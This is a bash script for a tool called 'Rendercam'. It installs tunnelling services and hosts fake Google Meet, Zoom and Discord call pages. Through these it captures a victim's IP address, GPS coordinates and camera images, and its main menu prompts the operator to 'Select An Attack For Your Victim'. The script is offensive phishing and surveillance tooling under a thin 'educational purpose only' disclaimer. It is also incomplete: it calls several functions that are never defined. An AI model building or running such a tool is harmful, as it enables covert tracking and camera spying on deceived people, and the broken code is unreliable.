#!/bin/bash

# Rendercam v1.0.0

__version__="1.0.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI Colors (Foreground + Background)
# Standard Colors
BLACK="$(printf '\033[30m')"   RED="$(printf '\033[31m')"     GREEN="$(printf '\033[32m')"  
YELLOW="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"    MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"    WHITE="$(printf '\033[37m')"   ORANGE="$(printf '\033[38;5;208m')"

# Bright Colors
BRIGHT_BLACK="$(printf '\033[90m')"   BRIGHT_RED="$(printf '\033[91m')"    
BRIGHT_GREEN="$(printf '\033[92m')"   BRIGHT_YELLOW="$(printf '\033[93m')"  
BRIGHT_BLUE="$(printf '\033[94m')"    BRIGHT_MAGENTA="$(printf '\033[95m')"  
BRIGHT_CYAN="$(printf '\033[96m')"    BRIGHT_WHITE="$(printf '\033[97m')"

# Background Colors
BLACKBG="$(printf '\033[40m')"   REDBG="$(printf '\033[41m')"     GREENBG="$(printf '\033[42m')"  
YELLOWBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"    MAGENTABG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"    WHITEBG="$(printf '\033[47m')"

# Bright Background Colors
BRIGHT_BLACKBG="$(printf '\033[100m')"   BRIGHT_REDBG="$(printf '\033[101m')"    
BRIGHT_GREENBG="$(printf '\033[102m')"   BRIGHT_YELLOWBG="$(printf '\033[103m')"  
BRIGHT_BLUEBG="$(printf '\033[104m')"    BRIGHT_MAGENTABG="$(printf '\033[105m')"  
BRIGHT_CYANBG="$(printf '\033[106m')"    BRIGHT_WHITEBG="$(printf '\033[107m')"

# Text Effects
BOLD="$(printf '\033[1m')"
DIM="$(printf '\033[2m')"
ITALIC="$(printf '\033[3m')"
UNDERLINE="$(printf '\033[4m')"
INVERT="$(printf '\033[7m')"
HIDDEN="$(printf '\033[8m')"
STRIKE="$(printf '\033[9m')"

# Reset
RESET="$(printf '\033[0m')"
RESETBG="$(printf '\033[49m')"


## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
        return
}

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "\$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "\$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq \$1" 2>/dev/null
    else
      taskkill /F /IM "\$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

## Main Banner
banner() {
    cat << EOF
                 ${CYAN}                     _
                 ${CYAN}                    | |
                 ${CYAN}  _ __ ___ _ __   __| | ___ _ __   ___ __ _ _ __ ___   
                 ${CYAN} |  __/ _ \  _ \ / _  |/ _ \  __| / __/ _  |  _   _ \  
                 ${CYAN} | | |  __/ | | | (_| |  __/ |   | (_| (_| | | | | | | 
                 ${CYAN} |_|  \___|_| |_|\__,_|\___|_|    \___\__,_|_| |_| |_| 
                 ${CYAN}     ${RED}Tool created by Render${CYAN}             ${RED}Version: ${__version__} 

        EOF
}


## Small Banner
banner_small() {
        cat <<- EOF
                 ${BLUE}
                 ${BLUE}░░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░█▀▀░█▀█░█▄█
                 ${BLUE}░░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░█░░░█▀█░█░█
                 ${BLUE}░░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀░▀
                 ${BLUE}                       ${RED}Version ${__version__}
        EOF
}


## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
        mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
        rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
        rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
        exit 0
}

exit_on_signal_SIGTERM() {
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
        exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM


## Kill already running process
kill_pid() {
        check_PID="php cloudflared loclx"
        for process in ${check_PID}; do
                if [[ $(pidof ${process}) ]]; then # Check for Process
                        killall ${process} > /dev/null 2>&1 # Kill the Process
                fi
        done
}

# Check for new update
check_update() {
  local release_url='https://api.github.com/repos/render437/render.phisher/releases/latest'
  local ua='render-phisher-updater/1.0 (+https://example.com)'
  local tmpfile new_version tarball_url

  # Prerequisites check
  for cmd in curl tar mktemp awk grep; do
    command -v "$cmd" >/dev/null 2>&1 || {
      echo "[!] Required command '$cmd' not found"
      return 1
    }
  done

  [ -n "$__version__" ] || { echo "[!] __version__ not set"; return 1; }
  [ -n "$BASE_DIR" ]   || { echo "[!] BASE_DIR not set"; return 1; }

  echo -ne "\n${BRIGHT_GREEN} Checking for update: "

  # --- Get latest version safely ---
  if command -v jq >/dev/null 2>&1; then
    new_version=$(curl -sS -A "$ua" "$release_url" | jq -r '.tag_name // .name // empty')
  else
    new_version=$(curl -sS -A "$ua" "$release_url" \
      | grep -E '"tag_name"|"name"' \
      | head -n1 \
      | awk -F\" '{print $4}')
  fi

  if [ -z "$new_version" ]; then
    echo -e "${ORANGE}Could not determine latest version.${WHITE}"
    return 1
  fi

  tarball_url="https://github.com/render437/render.phisher/archive/refs/tags/${new_version}.tar.gz"

  # --- Compare versions ---
  if [[ "$new_version" != "$__version__" ]]; then
    echo -e "${ORANGE}Update found${WHITE}"
    sleep 1
    echo -ne "\n${BRIGHT_GREEN} Downloading Update..."

    tmpfile=$(mktemp /tmp/rendercam.XXXXXX.tar.gz) \
      || { echo "[!] mktemp failed"; return 1; }

    # Download safely with retries
    if ! curl --fail --show-error --retry 3 --retry-delay 2 -L \
      -A "$ua" -o "$tmpfile" "$tarball_url"; then
      echo -e "\n${RED} Error occurred while downloading.${WHITE}"
      rm -f "$tmpfile"
      return 1
    fi

    # Ensure BASE_DIR exists
    if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
      echo -e "\n${RED} Cannot create BASE_DIR: $BASE_DIR${WHITE}"
      rm -f "$tmpfile"
      return 1
    fi

    # Extract safely
    if ! tar -xzf "$tmpfile" -C "$BASE_DIR" --strip-components=1 >/dev/null 2>&1; then
      echo -e "\n\n${RED} Error occurred while extracting.${WHITE}"
      rm -f "$tmpfile"
      return 1
    fi

    rm -f "$tmpfile"
    { sleep 1; clear; banner_small; } 2>/dev/null
    echo -e "\n${BRIGHT_GREEN} Successfully updated to ${new_version}! Run rendercam again\n"
    reset_color 2>/dev/null || true
    return 0

  else
    echo -e "${GREEN}Up to date${WHITE}"
    sleep .5
    return 0
  fi
}

## Check Internet Status
check_status() {
        echo -ne "\n${CYAN} Internet Status: "
        timeout 3s curl -fIs "https://api.github.com" > /dev/null
        [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e ""
}

## Dependencies
dependencies() {
        echo -e "\n${CYAN}Installing required packages..."

        if [[ -d "/data/data/com.termux/files/home" ]]; then
                if [[ ! $(command -v proot) ]]; then
                        echo -e "\n${CYAN} Installing package: ${ORANGE}proot${CYAN}"${WHITE}
                        pkg install proot resolv-conf -y
                fi

                if [[ ! $(command -v tput) ]]; then
                        echo -e "\n${CYAN} Installing package: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
                        pkg install ncurses-utils -y
                fi
        fi

        # Check for php, curl, unzip, and jq
        if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v jq) ]]; then
                echo -e "\n${GREEN} Packages already installed."
        else
                pkgs=(php curl unzip jq)  # Add jq to the list of packages
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ $(command -v pkg) ]]; then
                                        pkg install "$pkg" -y
                                elif [[ $(command -v apt) ]]; then
                                        sudo apt install "$pkg" -y
                                elif [[ $(command -v apt-get) ]]; then
                                        sudo apt-get install "$pkg" -y
                                elif [[ $(command -v pacman) ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ $(command -v dnf) ]]; then
                                        sudo dnf -y install "$pkg"
                                elif [[ $(command -v yum) ]]; then
                                        sudo yum -y install "$pkg"
                                else
                                        echo -e "\n${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi
}


# Download Binaries
download() {
        url="$1"
        output="$2"
        file=`basename $url`
        if [[ -e "$file" || -e "$output" ]]; then
                rm -rf "$file" "$output"
        fi
        curl --silent --insecure --fail --retry-connrefused \
                --retry 3 --retry-delay 2 --location --output "${file}" "${url}"

        if [[ -e "$file" ]]; then
                if [[ ${file#*.} == "zip" ]]; then
                        unzip -qq $file > /dev/null 2>&1
                        mv -f $output .server/$output > /dev/null 2>&1
                elif [[ ${file#*.} == "tgz" ]]; then
                        tar -zxf $file > /dev/null 2>&1
                        mv -f $output .server/$output > /dev/null 2>&1
                else
                        mv -f $file .server/$output > /dev/null 2>&1
                fi
                chmod +x .server/$output > /dev/null 2>&1
                rm -rf "$file"
        else
                echo -e "\n${RED} Error occured while downloading ${output}."
                { reset_color; exit 1; }
        fi
}


## Install Cloudflared
install_cloudflared() {
        if [[ -e ".server/cloudflared" ]]; then
                echo -e "\n${GREEN} Cloudflared already installed."
        else
                echo -e "\n${CYAN} Installing Cloudflared..."${WHITE}
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
                elif [[ "$arch" == *'aarch64'* ]]; then
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
                elif [[ "$arch" == *'x86_64'* ]]; then
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
                else
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
                fi
        fi
}

## Install LocalXpose
install_localxpose() {
        if [[ -e ".server/loclx" ]]; then
                echo -e "\n${GREEN} LocalXpose already installed."
        else
                echo -e "\n${CYAN} Installing LocalXpose..."${WHITE}
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
                elif [[ "$arch" == *'aarch64'* ]]; then
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
                elif [[ "$arch" == *'x86_64'* ]]; then
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
                else
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
                fi
        fi
}

## Install Ngrok
install_ngrok() {
    if command -v ngrok >/dev/null 2>&1; then
        echo -e "\n${GREEN} ngrok already installed."
        return
    fi

    echo -e "\n${CYAN} Installing ngrok...${WHITE}"

    ARCH=$(uname -m)

    # Pick correct binary for Intel or ARM Chromebooks
    if [[ "$ARCH" == "x86_64" ]]; then
        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz"
    elif [[ "$ARCH" == "aarch64" || "$ARCH" == arm* ]]; then
        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz"
    else
        echo -e "${RED} Unsupported CPU architecture: $ARCH"
        return 1
    fi

    mkdir -p .server
    cd .server

    # Download & extract
    wget -q "$NGROK_URL" -O ngrok.tgz
    tar -xvf ngrok.tgz >/dev/null
    rm ngrok.tgz

    # Move ngrok into .server directory
    mv ngrok loc-ngrok
    chmod +x loc-ngrok

    cd ..

    echo -e "${GREEN} ngrok installed successfully (anonymous mode)."
    echo -e "${YELLOW} You can use it with: ${WHITE}.server/loc-ngrok http 8080"
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## About
about() {
        { clear; banner; echo; }
        cat <<- EOF
                ${BRIGHT_GREEN} Author:   ${BRIGHT_BLUE}render437
                ${BRIGHT_GREEN} Github:   ${BRIGHT_BLUE}https://github.com/render437
                ${BRIGHT_GREEN} Version:  ${BRIGHT_BLUE}${__version__}

                ${RED}Warning:
                ${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}
                ${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}

                ${ORANGE}Contributors:
                ${BRIGHT_GREEN} Aditya Shakya, techchipnet, Kr3sZ, Prateek

                ${BRIGHT_MAGENTA}0. Main Menu     ${BRIGHT_MAGENTA}99. Exit

        EOF

        echo
        read -p "${MAGENTA}Select an option:"
        case $REPLY in 
                99)
                        msg_exit;;
                0 | 00)
                        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
                        { sleep 1; rendercam; };;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; about; };;
        esac
}


## Capture/Save IP to File
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt
}

## Capture/Save Location to File
catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
    # Filter out unwanted messages before displaying
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    
    # Move it to a backup to avoid duplicate display
    mv current_location.txt current_location.bak
  fi

  # Then check for any location_* files
  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    # Only display essential location data
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
    
    # Create directory for saved locations if it doesn't exist
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    
    mv "$location_file" saved_locations/
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
  else
    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
    
    # Don't display any debug logs to avoid showing unwanted messages
  fi
}

checkfound() {
# Create directory for saved locations if it doesn't exist
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

# Check for current_location.txt first (our new immediate indicator)
if [[ -e "current_location.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
fi

# Also check for LocationLog.log (the original indicator)
if [[ -e "LocationLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
# Don't display the raw log content, just process it
catch_location
rm -rf LocationLog.log
fi

# Don't display error logs to avoid showing unwanted messages
if [[ -e "LocationError.log" ]]; then
# Just remove the file without displaying its contents
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 
}

## Start Cloudflared
start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
        cusport
        echo -e "\n${ORANGE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${CYAN} Waiting for Cloudflare response..."

        if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
        else
                sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
        fi

        sleep 8
        cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
        custom_url "$cldflr_url"
        capture_data
}

localxpose_auth() {
        ./.server/loclx -help > /dev/null 2>&1 &
        sleep 1
        [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

        [ "$(./.server/loclx account status | grep Error)" ] && {
                echo -e "\n\n${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
                sleep 3
                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token:${ORANGE} " loclx_token
                [[ $loclx_token == "" ]] && {
                        echo -e "\n${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
                } || {
                        echo -n "$loclx_token" > $auth_f 2> /dev/null
                }
        }
}

## Start LocalXpose
start_loclx() {
        cusport
        echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; localxpose_auth; }
        echo -e "\n"
        read -n1 -p "${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
        [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
        echo -e "\n\n${GREEN} Launching LocalXpose..."

        if [[ `command -v termux-chroot` ]]; then
                sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
        else
                sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
        fi

        sleep 12
        loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
        custom_url "$loclx_url"
        capture_data
}

## Start localhost
start_localhost() {
        cusport
        echo -e "\n${BRIGHT_GREEN} Initializing... ${BRIGHT_GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        setup_site
        { sleep 1; clear; banner_small; }
        echo -e "\n${BRIGHT_GREEN} Successfully Hosted at: ${BRIGHT_GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
        capture_data
}

## Start ngrok
ngrok_auth() {
        ./.server/ngrok authtoken -help > /dev/null 2>&1 &
        sleep 1

        auth_f="$HOME/.ngrok2/ngrok.yml"

        # Check if ngrok is configured (authtoken exists in config file)
        if ! grep -q "authtoken:" "$auth_f"; then
                echo -e "\n\n${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
                sleep 3
                read -p "${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
                [[ $ngrok_token == "" ]] && {
                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
                } || {
                        # Create .ngrok2 directory if it doesn't exist
                        mkdir -p "$HOME/.ngrok2"

                        # Write the authtoken to the ngrok.yml file
                        echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
                        echo -e "\n${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
                }
        fi
}


start_ngrok() {
        cusport #Assuming this sets $HOST and $PORT
        ngrok_auth # Ensure authtoken is configured

        echo -e "\n${ORANGE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"

        echo -ne "\n\n${CYAN} Starting Ngrok tunnel..."

        if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok tcp $PORT &
        else
                sleep 2 && ./.server/ngrok tcp $PORT &
        fi


        sleep 5 #Give ngrok time to start

        #Find the ngrok URL (you may need to adjust the grep if the output format changes)
        ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')


        if [[ -z "$ngrok_url" ]]; then
                echo -e "\n${RED} Failed to retrieve Ngrok URL, check following possible reasons ${RED}"
                echo -e "\n${GREEN} CloudFlare tunnel service might be down ${GREEN}"
                echo -e "\n${GREEN} If you are using android, turn hotspot on ${GREEN}"
                echo -e "\n${GREEN} CloudFlared is already running, run this command killall cloudflared ${GREEN}"
                echo -e "\n${GREEN} Check your internet connection ${GREEN}"
                echo -e "\n${GREEN} Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors ${GREEN}"
                echo -e "\n${GREEN} On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1 ${GREEN}"

        else
                custom_url "$ngrok_url"
                capture_data
        fi

}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF
		${CYAN} 0. Main Menu
		${CYAN} 1. Localhost
		${CYAN} 2. Ngrok.io
		${CYAN} 3. Cloudflared
	EOF

	read -p "${MAGENTA} Select a port forwarding service or return to main menu:"

	case $REPLY in 
		0 | 00)
			echo -ne "\n${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Main Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		 ${RED}Select An Attack For Your Victim:
     ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Google Meet
     ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Zoom Call
     ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Discord Call

     ${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About
     ${BRIGHT_BLACK}00. ${BRIGHT_CYAN}Exit

	EOF

	echo
	read -p " ${BRIGHT_GREEN}Select an option: "

	case $REPLY in 
		1 | 01)
      printf "\n\e[1;92m[+] Starting Google Meet Template...\e[0m\n"
      # start_google_meet
      ;;
    2 | 02)
      printf "\n\e[1;92m[+] Starting Zoom Template...\e[0m\n"
      # start_zoom
      ;;
    3 | 03)
      printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
      # start_discord
      ;;
    99)
      about;;
    0 | 00 )
      msg_exit;;
    *)
      echo -ne "\n${RED} Invalid Option, Try Again..."
      { sleep 1; main_menu; };;

	esac
}

## Main
kill_pid
dependencies
check_status
install_ngrok
install_cloudflared
install_localxpose
main_menu
